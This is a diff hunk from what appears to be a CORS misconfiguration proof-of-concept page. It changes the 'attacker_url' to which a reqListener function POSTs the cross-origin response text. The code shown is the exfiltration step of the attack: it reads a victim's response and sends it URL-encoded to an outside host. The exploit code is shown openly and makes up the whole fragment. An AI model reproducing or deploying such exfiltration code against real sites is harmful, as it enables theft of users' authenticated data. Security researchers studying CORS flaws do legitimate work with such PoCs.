@@ -15,7 +15,7 @@
 
 			function reqListener() {
 				var data = new XMLHttpRequest();
-				var attacker_url = 'https://github.com/AbdUlrahman167/cors-poc/edit/main/poc.html';
+				var attacker_url = 'https://github.com/AbdUlrahman167/cors-poc/blob/main/poc.html';
 				data.open('POST', attacker_url);
 				data.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
